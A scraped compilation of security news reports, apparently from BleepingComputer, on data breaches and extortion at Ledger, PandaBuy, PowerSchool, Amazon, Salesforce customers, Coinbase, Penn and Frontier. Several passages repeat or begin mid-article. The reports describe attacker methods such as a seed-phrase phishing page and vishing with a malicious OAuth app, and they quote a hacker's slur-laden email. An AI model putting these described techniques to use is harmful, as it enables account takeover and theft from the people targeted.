""We regret to inform you that a recent data breach has affected our service. While your Ledger wallet remains secure, there is a possibility that recovery phrases (also known as ""seed phrases"") linked to certain accounts have been exposed,"" reads the phishing email. ""To safeguard your assets, we strongly encourage you to verify the security of your recovery phrase through our secure verification tool."" Clicking the ""Verify My Recovery Phrase"" button brings you to an Amazon AWS website at ""https://product-ledg.s3.us-west-1.amazonaws[.]com/recover.html"" that then redirects users to a phishing page at ""ledger-recovery[.]info"". The ledger-recovery[.]info domain was registered on December 15th, 2024. This website pretends to be a Ledger site that asks you to perform a security check to see if your recovery phrase is compromised, as shown below. Clicking the ""Verify your Ledger now"" brings up another page asking you to enter your 12, 18, or 24-word Ledger recovery phrase. As you enter each word, the phishing page will check if the word is one of 2,048 valid words that can be entered as part of a recovery phrase. If a word not on the list is entered, it will be shown with a line through it. As you enter each word, the phishing page will send all of the entered recovery words to the site's backend to store them on the server. BleepingComputer was told that no matter what recovery phrase you enter, it will always state that it was invalid. It is believed this being done so that targets enter the phrase multiple times, allowing the phishing page to verify that the correct words are being entered. Other people have also shared other Ledger phishing emails sent out recently, including one that pretends to be a new firmware update. It, too, attempts to steal users' recovery phrases. Armed with the recovery phrase, the attackers can gain full access to your cryptocurrency funds and steal them. First and foremost, never enter your recovery phrase or secret passphrase in any app or website. Recovery phrases should only be entered directly on the Ledger device you are trying to recover. As it is easy to create lookalike domains that impersonate legitimate sites, when it comes to cryptocurrency and financial assets, always type the domain you're trying to reach into your browser rather than relying on links in emails. This way, you know you are going to ledger.com rather than a site impersonating it. Finally, disregard any emails claiming to be from Ledger stating that you were affected by a recent data breach or asking you to verify your recovery phrase.

PandaBuy pays ransom to hacker only to get extorted again,https://www.bleepingcomputer.com/news/security/pandabuy-pays-ransom-to-hacker-only-to-get-extorted-again/#comments,Bill Toulas,"June 6, 2024","Chinese shopping platform Pandabuy told BleepingComputer it previously paid a ransom demand to prevent stolen data from being leaked, only for the same threat actor to extort the company again this week. PandaBuy is an online platform that acts as an intermediary between customers and various Chinese e-commerce websites, including Tmall, Taobao, and JD.com, which don't ship internationally. The service allows users to purchase products from these websites, which are often cheaper or have unique items not available elsewhere, and have them shipped to their location. On March 31, 2024, a threat actor using the alias 'Sanggiero' published 3 million rows of data stolen from PandaBuy on BreachForums, exposing customer names, phone numbers, email addresses, login IP addresses, home addresses, and order details. The threat actor claimed they managed to steal that data by exploiting several critical vulnerabilities in the PandaBuy API. This data was shared with the data breach notification service Have I Been Pwned (HIBP), which added 1.35 million email addresses from this incident to its system. At the time, Pandabuy opted not to make any public statements, and there were even reports of the firm attempting to censor customer reports on Discord and Reddit. On June 3, 2024, the same threat actor offered to sell what he claimed was the entire database he previously stole from Pandabuy for $40,000. This database allegedly contains 17 million rows, indicating a much larger data set. Sanggiero did not provide evidence of additional customer data in the form of samples but uploaded screenshots showing sensitive employee information such as emails and passwords. A Pandabuy spokesperson admitted to BleepingComputer that they had paid the hacker an undisclosed amount to stop the data leak, adding that the threat actor may have shared the data with others, so they would no longer cooperate with him. "" At present, we cannot continue to pay the hacker fees due to the frozen funds, and the data he leaked is the same as the last one. We have confirmed with the technical department that all the loopholes have been fixed at the time of the first leak incident. And for all we know, he secretly sold our data to other agents after he made the deal with us. We can not cooperate with him in the future. "" BleepingComputer reached out to Sanggiero about the company's statement but has not heard back at this time. For now, it is better to take an abundance of caution and be on the lookout for unsolicited messages from people claiming to be Pandabuy, which may be a phishing attempt to gather additional personal nformation. If you have not previously reset your password at Pandabuy, it is strongly advised that you do so now, in case additional data was stolen, as the threat actor claims.

Though this is a step forward, the company has still not officially disclosed the exact number of individuals impacted by the security incident. Moreover, a detailed report on what exactly has happened, expected by CrowdStrike, who is involved in the investigations, continues to be overdue. PowerSchool is a cloud-based K-12 software provider serving over 60 million students and 18,000 customers worldwide, offering enrollment, communication, attendance, staff management, learning, analytics, and finance solutions. In December, the company suffered a breach where attackers gained unauthorized access to one of its customer support portals, PowerSource, and stole sensitive data from 6,505 school districts. The stolen data includes varying types of information per district, including full names, physical addresses, contact information, Social Security numbers (SSNs), medical data, and grades. Although the company alleged that the incident only impacted a subset of customers, a threat actor claimed in their extortion demand that they stole data of 62,488,628 students and 9,506,624 teachers, indicating the scope of the breach was all but limited. In an update published on the PowerSchool website yesterday, the company says it has started notifying individuals affected by the data breach. This includes current and former students, if applicable, their parents and guardians, and also educators in the U.S., Canada, and abroad. ""PowerSchool began the process of filing regulatory notifications with Attorneys General Offices across applicable U.S. jurisdictions on behalf of impacted customers who have not opted-out of our offer to do so,"" reads the status update . ""PowerSchool has also started the process of notifying Canadian regulators. We will provide a separate update to our international customers later this week."" PowerSchool has already shared a sample notification with Maine's Attorney General's office, which states that 33,488 people were impacted in that state. However, it does not include the total number of affected people. Depending on the school district, the data breach notifications will alert individuals if their Social Security Numbers and medical information were stolen, which does not appear to be the case for Maine residents. The company offers impacted students and teachers free two-year identity theft protection services and credit monitoring for adults.

PowerSchool starts notifying victims of massive data breach,https://www.bleepingcomputer.com/news/security/powerschool-starts-notifying-victims-of-massive-data-breach/,Bill Toulas,"January 28, 2025","Education software giant PowerSchool has started notifying individuals in the U.S. and Canada whose personal data was exposed in a late December 2024 cyberattack. Though this is a step forward, the company has still not officially disclosed the exact number of individuals impacted by the security incident. Moreover, a detailed report on what exactly has happened, expected by CrowdStrike, who is involved in the investigations, continues to be overdue. PowerSchool is a cloud-based K-12 software provider serving over 60 million students and 18,000 customers worldwide, offering enrollment, communication, attendance, staff management, learning, analytics, and finance solutions. In December, the company suffered a breach where attackers gained unauthorized access to one of its customer support portals, PowerSource, and stole sensitive data from 6,505 school districts. The stolen data includes varying types of information per district, including full names, physical addresses, contact information, Social Security numbers (SSNs), medical data, and grades. Although the company alleged that the incident only impacted a subset of customers, a threat actor claimed in their extortion demand that they stole data of 62,488,628 students and 9,506,624 teachers, indicating the scope of the breach was all but limited. In an update published on the PowerSchool website yesterday, the company says it has started notifying individuals affected by the data breach. This includes current and former students, if applicable, their parents and guardians, and also educators in the U.S., Canada, and abroad. ""PowerSchool began the process of filing regulatory notifications with Attorneys General Offices across applicable U.S. jurisdictions on behalf of impacted customers who have not opted-out of our offer to do so,"" reads the status update . ""PowerSchool has also started the process of notifying Canadian regulators. We will provide a separate update to our international customers later this week."" PowerSchool has already shared a sample notification with Maine's Attorney General's office, which states that 33,488 people were impacted in that state. However, it does not include the total number of affected people. Depending on the school district, the data breach notifications will alert individuals if their Social Security Numbers and medical information were stolen, which does not appear to be the case for Maine residents. The company offers impacted students and teachers free two-year identity theft protection services and credit monitoring for adults. It's budget season!

Amazon confirms employee data breach after vendor hack,https://www.bleepingcomputer.com/news/security/amazon-confirms-employee-data-breach-after-vendor-hack/,Sergiu Gatlan,"November 11, 2024","Amazon confirmed a data breach involving employee information after data allegedly stolen during the May 2023 MOVEit attacks was leaked on a hacking forum. The threat actor behind this data leak, known as Nam3L3ss, published over 2.8 million lines of Amazon employee data, including names, contact information, building locations, email addresses, and more. Amazon spokesperson Adam Montgomery confirmed Nam3L3ss' claims, adding that this data was stolen from systems belonging to a third-party service provider. ""Amazon and AWS systems remain secure, and we have not experienced a security event. We were notified about a security event at one of our property management vendors that impacted several of its customers including Amazon,"" Montgomery said. ""The only Amazon information involved was employee work contact information, for example work email addresses, desk phone numbers, and building locations."" The company said the breached vendor only had access to employee contact information, and the attackers didn't access or steal sensitive employee information like Social Security numbers, government identification, or financial information. Amazon added that the vendor has since patched the security vulnerability used in the attack. Nam3L3ss has also leaked the data from twenty-five other companies. However, they say some of the data was obtained from other sources, including ransom gangs' leak sites and exposed AWS and Azure buckers. ""I download entire databases from exposed web sources including mysql, postgres, SQL Server databases and backups, azure databases and backups etc and then convert them to csv or other format,"" they said. ""DO NOT ask me for access to my storage etc, at present I have well over 250TB of archived database files etc."" The list of companies whose data was stolen in MOVEit attacks or harvested from Internet-exposed resources and has now been leaked on the hacking forum includes Lenovo, HP, TIAA, Schwab, HSBC, Delta, McDonald's, and Metlife, among others (as shown in the table below). BleepingComputer has contacted multiple companies and will update this article when additional information is available. The Clop ransomware gang was behind a wave of data theft attacks starting on May 27, 2023. While the threat actor has said that the data was collected from various sources, the date of May 30, 2023, coincides with the MOVEit data theft attacks that occurred over the long US Memorial Day holiday. The data leaked for each of the twenty-five companies is similar, so it is believed that the data was stolen from a single vendor during these attacks and has now been released as separate data sets for the impacted customers. The data-theft attacks leveraged a zero-day security flaw in the MOVEit Transfer secure file transfer platform, a managed file transfer (MFT) solution used in enterprise environments to securely transfer files between business partners and customers.

"ShinyHunters behind Salesforce data theft attacks at Qantas, Allianz Life, and LVMH",https://www.bleepingcomputer.com/news/security/shinyhunters-behind-salesforce-data-theft-attacks-at-qantas-allianz-life-and-lvmh/,Lawrence Abrams,"July 30, 2025","A wave of data breaches impacting companies like Qantas, Allianz Life, LVMH, and Adidas has been linked to the ShinyHunters extortion group, which has been using voice phishing attacks to steal data from Salesforce CRM instances. In June, Google's Threat Intelligence Group (GTIG) warned that threat actors tracked as UNC6040 were targeting Salesforce customers in social engineering attacks . In these attacks, the threat actors impersonated IT support staff in phone calls to targeted employees, attempting to persuade them into visiting Salesforce's connected app setup page. On this page, they were told to enter a ""connection code"", which linked a malicious version of Salesforce's Data Loader OAuth app to the target's Salesforce environment. In some cases, the Data Loader component was renamed to ""My Ticket Portal,"" to make it more convincing in the attacks. GTIG says that these attacks were usually conducted through vishing (voice phishing), but credentials and MFA tokens were also stolen through phishing pages that impersonated Okta login pages. Around the time of this report, multiple companies reported data breaches involving third-party customer service or cloud-based CRM systems. LVMH subsidiaries Louis Vuitton , Dior , and Tiffany & Co. each disclosed unauthorized access to a customer information database, with Tiffany Korea notifying customers the attackers breached a ""vendor platform used for managing customer data."" Adidas , Qantas , and Allianz Life also reported breaches involving third-party systems, with Allianz confirming it was a third-party customer relationship management platform. ""On July 16, 2025, a malicious threat actor gained access to a third-party, cloud-based CRM system used by Allianz Life Insurance Company of North America (Allianz Life),"" an Allianz Life spokesperson told BleepingComputer. While BleepingComputer has learned that the Qantas data breach also involved a third-party customer relationship management platform, the company will not confirm it is Salesforce. However, previous reporting from local media claims the data was stolen from Qantas' Salesforce instance. Furthermore, court documents state that the threat actors targeted "" Accounts "" and "" Contacts "" database tables, both of which are Salesforce objects. While none of these companies have publicly named Salesforce, BleepingComputer has since confirmed that all were targeted in the same campaign detailed by Google. The attacks have not led to public extortion or data leaks yet, with BleepingComputer learning that the threat actors are attempting to privately extort companies over email, where they name themselves as ShinyHunters. It is believed that when these extortion attempts fail, the threat actors will release stolen information in a long wave of leaks, similar to ShinyHunter's previous Snowflake attacks . ""We have not identified any data leak sites associated with this activity,"" Genevieve Stark, Head of Cybercrime, and Information Operations Intelligence Analysis at GTIG, told BleepingComputer. ""It is plausible that the threat actor intends to sell the data instead of sharing it publicly. This approach would align with prior ShinyHunters Group activity."" Google say they are now tracking Salesforce data-theft attacks under multiple threat group designations. ""GTIG attributes multiple incidents impacting Salesforce instances to UNC6040. In at least some cases, the follow-on extortion activity, which we attribute to the distinct threat cluster UNC6240, has used the ShinyHunters brand,"" Stark told BleepingComputer. ""The extortion activity is attributed to UNC6240 instead of UNC6040 due to a significant time gap between the initial data theft activity and the subsequent extortion activity. We have not confirmed the nature of the relationship between these intrusions and the prior use of this handle on underground forums."" The breaches have caused confusion among the cybersecurity community and the media, including BleepingComputer, with the attacks attributed to Scattered Spider (tracked by Mandiant as UNC3944), as those threat actors were also targeting the aviation , retail , and insurance sectors around the same time and demonstrated similar tactics. However, threat actors associated with Scattered Spider tend to perform full-blown network breaches, culminating with data theft and, sometimes, ransomware. ShinyHunters, tracked as UNC6040, on the other hand, tends to focus more on data-theft extortion attacks targeting a particular cloud platform or web application. It is BleepingComputer's and some security researchers' belief that both UNC6040/UNC6240 and UNC3944 consist of overlapping members that communicate within the same online communities. The threat group is also believed to overlap with ""The Com,"" a network of experienced English-speaking cybercriminals. ""According to Recorded Future intelligence, the overlapping TTPs between known Scattered Spider and ShinyHunters attacks indicate likely some crossover between the two groups,"" Allan Liska, an Intelligence Analyst for Recorded Future, told BleepingComputer. Other researchers have told BleepingComputer that ShinyHunters and Scattered Spider appear to be operating in lockstep, targeting the same industries at the same time, making it harder to attribute attacks.

Another theory is that ShinyHunters is acting as an extortion-as-a-service, where they extort companies on behalf of other threat actors in exchange for a revenue share, similar to how ransomware-as-a-service gangs operate.

"ShinyHunters behind Salesforce data theft attacks at Qantas, Allianz Life, and LVMH",https://www.bleepingcomputer.com/news/security/shinyhunters-behind-salesforce-data-theft-attacks-at-qantas-allianz-life-and-lvmh/#comment_form,Lawrence Abrams,"July 30, 2025","A wave of data breaches impacting companies like Qantas, Allianz Life, LVMH, and Adidas has been linked to the ShinyHunters extortion group, which has been using voice phishing attacks to steal data from Salesforce CRM instances. In June, Google's Threat Intelligence Group (GTIG) warned that threat actors tracked as UNC6040 were targeting Salesforce customers in social engineering attacks . In these attacks, the threat actors impersonated IT support staff in phone calls to targeted employees, attempting to persuade them into visiting Salesforce's connected app setup page. On this page, they were told to enter a ""connection code"", which linked a malicious version of Salesforce's Data Loader OAuth app to the target's Salesforce environment. In some cases, the Data Loader component was renamed to ""My Ticket Portal,"" to make it more convincing in the attacks. GTIG says that these attacks were usually conducted through vishing (voice phishing), but credentials and MFA tokens were also stolen through phishing pages that impersonated Okta login pages. Around the time of this report, multiple companies reported data breaches involving third-party customer service or cloud-based CRM systems. LVMH subsidiaries Louis Vuitton , Dior , and Tiffany & Co. each disclosed unauthorized access to a customer information database, with Tiffany Korea notifying customers the attackers breached a ""vendor platform used for managing customer data."" Adidas , Qantas , and Allianz Life also reported breaches involving third-party systems, with Allianz confirming it was a third-party customer relationship management platform. ""On July 16, 2025, a malicious threat actor gained access to a third-party, cloud-based CRM system used by Allianz Life Insurance Company of North America (Allianz Life),"" an Allianz Life spokesperson told BleepingComputer. While BleepingComputer has learned that the Qantas data breach also involved a third-party customer relationship management platform, the company will not confirm it is Salesforce. However, previous reporting from local media claims the data was stolen from Qantas' Salesforce instance. Furthermore, court documents state that the threat actors targeted "" Accounts "" and "" Contacts "" database tables, both of which are Salesforce objects. While none of these companies have publicly named Salesforce, BleepingComputer has since confirmed that all were targeted in the same campaign detailed by Google. The attacks have not led to public extortion or data leaks yet, with BleepingComputer learning that the threat actors are attempting to privately extort companies over email, where they name themselves as ShinyHunters. It is believed that when these extortion attempts fail, the threat actors will release stolen information in a long wave of leaks, similar to ShinyHunter's previous Snowflake attacks . ""We have not identified any data leak sites associated with this activity,"" Genevieve Stark, Head of Cybercrime, and Information Operations Intelligence Analysis at GTIG, told BleepingComputer. ""It is plausible that the threat actor intends to sell the data instead of sharing it publicly. This approach would align with prior ShinyHunters Group activity."" Google say they are now tracking Salesforce data-theft attacks under multiple threat group designations. ""GTIG attributes multiple incidents impacting Salesforce instances to UNC6040. In at least some cases, the follow-on extortion activity, which we attribute to the distinct threat cluster UNC6240, has used the ShinyHunters brand,"" Stark told BleepingComputer. ""The extortion activity is attributed to UNC6240 instead of UNC6040 due to a significant time gap between the initial data theft activity and the subsequent extortion activity. We have not confirmed the nature of the relationship between these intrusions and the prior use of this handle on underground forums."" The breaches have caused confusion among the cybersecurity community and the media, including BleepingComputer, with the attacks attributed to Scattered Spider (tracked by Mandiant as UNC3944), as those threat actors were also targeting the aviation , retail , and insurance sectors around the same time and demonstrated similar tactics. However, threat actors associated with Scattered Spider tend to perform full-blown network breaches, culminating with data theft and, sometimes, ransomware. ShinyHunters, tracked as UNC6040, on the other hand, tends to focus more on data-theft extortion attacks targeting a particular cloud platform or web application. It is BleepingComputer's and some security researchers' belief that both UNC6040/UNC6240 and UNC3944 consist of overlapping members that communicate within the same online communities. The threat group is also believed to overlap with ""The Com,"" a network of experienced English-speaking cybercriminals. ""According to Recorded Future intelligence, the overlapping TTPs between known Scattered Spider and ShinyHunters attacks indicate likely some crossover between the two groups,"" Allan Liska, an Intelligence Analyst for Recorded Future, told BleepingComputer.

Hunt's findings come after the company filed a breach notification with the Office of the Maine Attorney General, stating that the breach only impacted 64,472 people . In a separate incident notification published on its website, Neiman Marcus revealed that the data exposed in the attack included names, contact information (e.g., email and postal addresses, and phone numbers), dates of birth, gift card info, transaction data, partial credit card (without expiration dates or CVVs) and Social Security numbers, and employee identification numbers. While analyzing the data stolen in the breach, Hunt found 30 million unique email addresses and told BleepingComputer that he also confirmed with multiple people whose data was in the stolen database that the information was legitimate. ""That's obviously a substantial number and I do want to get notifications out to them promptly. The total unique number of addresses I'll be referring to is 31,152,842,"" Hunt told BleepingComputer. He said that roughly 105,000 Have I Been Pwned subscribers found in the data set will receive an email informing them of this massive data breach. When BleepingComputer contacted a Neiman Marcus spokesperson to confirm Hunt's findings, they declined to comment. Instead, they pointed us to the data security notification published on the company's website and said that the 64,472 people mentioned in the Maine filing are those who have received data breach notifications.

Expensive Investigations Drive Surging Data Breach Costs,https://www.bleepingcomputer.com/news/security/expensive-investigations-drive-surging-data-breach-costs/,Home,"September 20, 2023","The dreaded data breach is an outcome feared by companies of all sizes in today’s threat landscape, largely due to the significant costs involved. Each year, IBM’s eagerly anticipated Cost of a Data Breach Report seems to come with the bad news of an increase in data breach costs, and 2023 is no exception. Threat actors continue their relentless pursuit of data as the most valuable company resource to compromise in cyberattacks. The average cost of a data breach now stands at an all-time high of $4.45 million. While this overall figure receives much of the publicity in media reports, there’s less emphasis on how increasingly costly incident investigations drive much of this year-on-year increase. Read on to dive deeper into why data breach investigations are so expensive and find out what your business can do to reduce these costs. Investigating a data breach involves a resource-intensive combination of technical, administrative, legal, and communication activities, which together prove rather pricey for companies. The 2022 IBM report marked the point at which incident investigations (referred to in the report as ‘detection and escalation’) took over as the costliest category of data breach expenses. That trend continues in the 2023 report , which shows that detection and escalation cost an average of $1.58 million per breach, or over 35 percent of the total average cost. But why are data breach investigation costs on the rise? Here are some factors driving the increased expenses: Reducing the cost of data breach investigations requires a mix of proactive and reactive measures to ensure not only that you're ready when a breach occurs but also that you're taking steps to prevent them in the first place. Here are some suggestions for preventing data breaches in the first place: Information governance defines and enforces policies, procedures, standards, and controls around the management of data. The objective is to make sure that your company and its people handle data efficiently, securely, and in compliance with legal and regulatory obligations. Robust information governance is pivotal for answering questions like what data you have, where it’s stored, and who has access to it. Policy-based controls and tools can help maintain an inventory of your information assets and delete unneeded data on time. Uniform procedures mean that users are more likely to consistently handle and store data, regardless of their business department/unit. All of this helps to uncover gaps in protection for your data assets and reduce breach risks due to lax practices. Regularly educate employees about the importance of security and how to recognize phishing attempts and other threats. Employees should understand their responsibilities in handling data securely and know how to avoid risky practices, such as visiting untrusted websites. A security-conscious workforce goes a long way towards reducing risks from the significant human factor in data breaches. Treat security training and awareness as ongoing throughout the year rather than an annual or quarterly internal box to tick. Regular reminders dotted around the office, a range of different media to spread awareness, and some fun exercises can all help reinforce what’s important to learn (and remember). Continuous vulnerability management (CVM) takes a more proactive approach to identifying, assessing, and addressing vulnerabilities in an organization's IT environment. Vulnerability management is often too reactive, which leaves gaping holes that threat actors can find and exploit to access data. One study from 2020 found that 84 percent of companies had high-risk vulnerabilities that were accessible and exploitable at their network perimeter. The CVM approach is to routinely scan your IT infrastructure for known vulnerabilities. Early detection allows your business to patch or mitigate vulnerabilities before hackers exploit them in their pursuit of data. With CVM, you’re more likely to apply software updates and patches and avoid data breaches that stem from outdated, vulnerable code. Simulated cyberattacks involve security professionals attempting to breach your defenses in a scenario that mirrors a real-world cyberattack. Simulated attacks help pinpoint weaknesses in infrastructure, applications, and other systems that you didn’t even know about. Discovering these gaps proactively enables you to address them before they're exploited ‘in the wild’ by data-hungry adversaries. Another benefit of addressing weaknesses found during simulated attacks is that it’s typically less expensive than managing the fallout from a real data breach. Proactive testing can save significant costs in the long run from direct remediation expenses to reputational damages and potential fines. Effective forensic and investigative activities drive faster detection and response to data breaches. Delays in identifying and containing breaches lead to higher investigation costs. It takes companies 204 days on average to identify a breach and 73 days to contain each breach in 2023, as reported by IBM. Actionable and reliable cyber threat intelligence (CTI) plays an instrumental role in informing forensic and investigative activities. As a result, good CTI helps you respond to breaches faster and more cost-effectively. CTI involves gathering, analyzing, and disseminating information about current and potential cyber threats and attack methods. The difficulty with gathering good cyber threat intelligence is that it’s time-consuming, which is not ideal given that your in-house security staff deal with many other problems and priorities each day. Chronic labor market shortages don’t help; CTI requires experts who know what intel sources are good, and how to analyze data to distinguish between useful and useless information. Despite its power in reducing data breach costs and keeping your fingers on the pulse of a rapidly evolving threat landscape, 79 percent of security professionals say they make decisions without any threat intelligence. To overcome this dearth of intelligence-backed decisions when trying to swiftly detect and respond to data breaches, consider leveraging Cyber Threat Intelligence with Outpost 24’s Threat Compass. Our solution is modular, which means you get to select only the types of intelligence that you feel are most pertinent for your business, sector, and areas of cyber risk.

Coinbase breach tied to bribed TaskUs support agents in India,https://www.bleepingcomputer.com/news/security/coinbase-breach-tied-to-bribed-taskus-support-agents-in-india/#comments,Bill Toulas,"June 3, 2025","A recently disclosed data breach at Coinbase has been linked to India-based customer support representatives from outsourcing firm TaskUs, who threat actors bribed to steal data from the crypto exchange. According to Reuters, who spoke to numerous TaskUs employees, the data breach was first discovered in January after a TaskUs employee was caught capturing photos of her computer screen using a personal device. Reportedly, the incident was witnessed by multiple TaskUs employees, and during the subsequent investigations, two admitted they were funneling sensitive Coinbase user data to external hackers in exchange for bribes. Upon confirming the data theft in January 2025, TaskUs informed Coinbase accordingly, four months before the breach was publicly disclosed. Coinbase first disclosed the incident on May 15, stating that rogue support agents stole customer data, including names, emails, partial financial information and SSN, transaction history, and ID document scans. ""Cyber criminals bribed and recruited a group of rogue overseas support agents to steal Coinbase customer data to facilitate social engineering attacks. These insiders abused their access to customer support systems to steal the account data for a small subset of customers,"" read Coinbase's statement . Coinbase further stated that the threat actors demanded a ransom payment of $20,000,000 from Coinbase not to publish the stolen data. Instead of succumbing to the demands, the cryptocurrency exchange offered an equal-value reward to unmask those responsible for the extortion attempt. Coinbase estimated that the incident would cause losses of up to $400 million. On May 21, Coinbase started notifying nearly 70,000 customers who were impacted by the incident. BleepingComputer contacted both Coinbase and TaskUs about the Reuters report, and a TaskUs spokesperson confirmed that they were involved but stated the employees were recruited as part of a much larger, coordinated criminal campaign. ""Early this year we identified two individuals who illegally accessed information from one of our clients,"" TaskUs told BleepingComputer. ""We believe these two individuals were recruited by a much broader, coordinated criminal campaign against this client that also impacted a number of other providers servicing this client."" ""We immediately reported this activity to the client, terminated the individuals involved, and are coordinating with law enforcement. Out of an abundance of caution, TaskUs ceased all Coinbase operations in Indore, India, in early January 2025, impacting 226 teammates. Following the investigation, all teammates, excluding the two bad actors, were offered a generous severance package, including six months of pay."" Indian media previously covered TaskUs' firing of employees in India, which led to protests by staff. Coinbase has not responded to BleepingComputer's request for a comment.

Upon confirming the data theft in January 2025, TaskUs informed Coinbase accordingly, four months before the breach was publicly disclosed. Coinbase first disclosed the incident on May 15, stating that rogue support agents stole customer data, including names, emails, partial financial information and SSN, transaction history, and ID document scans. ""Cyber criminals bribed and recruited a group of rogue overseas support agents to steal Coinbase customer data to facilitate social engineering attacks. These insiders abused their access to customer support systems to steal the account data for a small subset of customers,"" read Coinbase's statement . Coinbase further stated that the threat actors demanded a ransom payment of $20,000,000 from Coinbase not to publish the stolen data. Instead of succumbing to the demands, the cryptocurrency exchange offered an equal-value reward to unmask those responsible for the extortion attempt. Coinbase estimated that the incident would cause losses of up to $400 million. On May 21, Coinbase started notifying nearly 70,000 customers who were impacted by the incident. BleepingComputer contacted both Coinbase and TaskUs about the Reuters report, and a TaskUs spokesperson confirmed that they were involved but stated the employees were recruited as part of a much larger, coordinated criminal campaign. ""Early this year we identified two individuals who illegally accessed information from one of our clients,"" TaskUs told BleepingComputer. ""We believe these two individuals were recruited by a much broader, coordinated criminal campaign against this client that also impacted a number of other providers servicing this client."" ""We immediately reported this activity to the client, terminated the individuals involved, and are coordinating with law enforcement. Out of an abundance of caution, TaskUs ceased all Coinbase operations in Indore, India, in early January 2025, impacting 226 teammates. Following the investigation, all teammates, excluding the two bad actors, were offered a generous severance package, including six months of pay."" Indian media previously covered TaskUs' firing of employees in India, which led to protests by staff. Coinbase has not responded to BleepingComputer's request for a comment.

On Friday, University of Pennsylvania alumni and students began receiving multiple offensive emails from Penn.edu addresses claiming the university had been hacked and data stolen. ""The University of Pennsylvania is a dog**** elitist institution full of woke retards. We have terrible security practices and are completely unmeritocratic,"" reads the email sent to Penn alumni and students. ""We hire and admit morons because we love legacies, donors, and unqualified affirmative action admits. We love breaking federal laws like FERPA (all your data will be leaked) and Supreme Court rulings like SFFA."" BleepingComputer confirmed the emails originated from connect.upenn.edu, a Penn mailing list platform hosted on Salesforce Marketing Cloud. The university downplayed the incident, describing the messages as ""fraudulent emails"" that were ""obviously fake."" However, the threat actor behind the attack contacted BleepingComputer, claiming the intrusion was far broader and that they had gained access to multiple university systems. The hacker said their group ""gained full access"" to an employee's PennKey SSO account, allowing access to Penn's VPN, Salesforce data, Qlik analytics platform, SAP business intelligence system, and SharePoint files. They said they exfiltrated data for roughly 1.2 million students, alumni, and donors, including names, dates of birth, addresses, phone numbers, estimated net worth, donation history, and demographic details such as religion, race, and sexual orientation. The threat actors shared screenshots and data samples with BleepingComputer and posted them online to prove that they had indeed accessed these systems and stolen data from Penn. The attackers told BleepingComputer they breached Penn's systems on October 30th and completed data downloads by October 31st, when the compromised employee account was locked and access lost. After discovering their access had been revoked, the hacker said they still had access to Salesforce Marketing Cloud and used it to send the offensive mass email to roughly 700,000 recipients. When asked whether the credentials were stolen via an infostealer or phishing, the hacker declined to elaborate, saying the intrusion was simple and caused by Penn's security lapses. The hacker has since published a 1.7-GB archive containing spreadsheets, donation materials, and other files allegedly taken from Penn's SharePoint and Box systems. The attacker told BleepingComputer they were not extorting the university, saying, ""We don't think they'd pay, and we can extract plenty of value out of the data ourselves."" When asked about their motivation, the hackers said the attack was not political but aimed at obtaining Penn's donor database. ""While we're not really politically motivated, we have no love for these nepobaby-serving institutions,"" the hackers told BleepingComputer. ""The main goal was their vast, wonderfully wealthy donor database."" The donor database has not yet been leaked, though the threat actors claim they may release it in a month or two. When contacted with these claims, the University of Pennsylvania told BleepingComputer, ""We are continuing to investigate."" After publishing this story, The Daily Pennsylvanian reported that Penn has referred the security incident to the FBI. ""We understand and share our community’s concerns and have reported this to the FBI. We are working with law enforcement as well as other third-party technical resources to address this as rapidly as possible,"" stated a Penn spokesperson. With a large amount of donor data now exposed, Penn donors should stay vigilant against targeted phishing or social engineering attempts.

Frontier is a leading U.S. communications provider that provides gigabit Internet speeds over a fiber-optic network to millions of consumers and businesses across 25 states. The telecommunications provider says it suffered a cyberattack in mid-April 2024, allowing hackers to access customers' personal information stored on its systems. ""On April 14, 2024, we detected unauthorized access to some of our internal IT systems,"" reads the data breach notification sent to impacted customers. ""Our investigation identified your personal information among the data affected by this incident."" The sample of the notice submitted to the Office of the Maine AG has censored the types of data exposed in this incident, but full names and Social Security Numbers (SSNs) were confirmed as breached for 751895 customers. The telco clarifies that no customer financial information was exposed due to this breach. Frontier says it has informed the regulatory authorities about the security breach and implemented additional measures to strengthen its network security. Investigations on the incident's impact are currently underway. The company enclosed instructions on enrolling in one year of free credit monitoring and identity theft services through Kroll, which impacted clients are recommended to take up as soon as possible. While Frontier did not share many details about the incident in their notification, at the time, the company was forced to shut down some of its systems to contain the attack and prevent it from impacting other devices on the network. Many customers also reported that their Internet connection had been down during the attack, with the support phone numbers playing prerecorded messages instead of redirecting to a human operator. These data breach notifications come after the RansomHub extortion group claimed responsibility earlier this week for the attack on Frontier. On Tuesday, June 4, RansomHub added Frontier Communications to its extortion portal on the dark web, threatening to leak 5GB of data allegedly stolen during the attack, containing the information of 2 million customers. A screenshot (redacted below) contains customer information, such as full name, date of birth, physical address, social security number, email address, subscription status, and service notes. The threat actors have given Frontier until June 14 to respond to their demands, or they will sell the data to a single buyer, the highest bidder. If you are a Frontier customer, it is advisable to treat unsolicited communications with caution, refrain from sharing information with people you don't know, reset your account passwords, and monitor bank statements. RansomHub was recently exposed as a likely buyer of the Knight ransomware source code , but they rarely use encryption in their attacks, typically limiting the scope to data-theft-based extortion. In the case of Frontier Communications, there's no mention of encryption or reports about service outages apart from those linked to the containment measures in mid-April.

Many customers also reported that their Internet connection had been down during the attack, with the support phone numbers playing prerecorded messages instead of redirecting to a human operator. These data breach notifications come after the RansomHub extortion group claimed responsibility earlier this week for the attack on Frontier. On Tuesday, June 4, RansomHub added Frontier Communications to its extortion portal on the dark web, threatening to leak 5GB of data allegedly stolen during the attack, containing the information of 2 million customers. A screenshot (redacted below) contains customer information, such as full name, date of birth, physical address, social security number, email address, subscription status, and service notes. The threat actors have given Frontier until June 14 to respond to their demands, or they will sell the data to a single buyer, the highest bidder. If you are a Frontier customer, it is advisable to treat unsolicited communications with caution, refrain from sharing information with people you don't know, reset your account passwords, and monitor bank statements. RansomHub was recently exposed as a likely buyer of the Knight ransomware source code , but they rarely use encryption in their attacks, typically limiting the scope to data-theft-based extortion. In the case of Frontier Communications, there's no mention of encryption or reports about service outages apart from those linked to the containment measures in mid-April.

